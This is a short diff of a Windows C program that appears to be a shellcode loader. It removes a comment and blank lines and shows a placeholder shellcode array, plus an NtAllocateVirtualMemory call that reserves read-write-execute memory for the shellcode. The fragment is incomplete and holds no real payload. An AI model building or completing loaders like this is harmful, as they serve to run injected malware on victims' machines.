@@ -4,7 +4,6 @@
 
 #include <windows.h>  
 #include <stdio.h>   
-// something is missing here
 
 
 int main() {
@@ -14,8 +13,6 @@ int main() {
 
     // Replace this with your actual shellcode
     unsigned char shellcode[] = "\xfc\x48\x83...";
-
-
 
     // Use the NtAllocateVirtualMemory function to allocate memory for the shellcode
     NtAllocateVirtualMemory((HANDLE)-1, (PVOID*)&allocBuffer, (ULONG_PTR)0, &buffSize, (ULONG)(MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
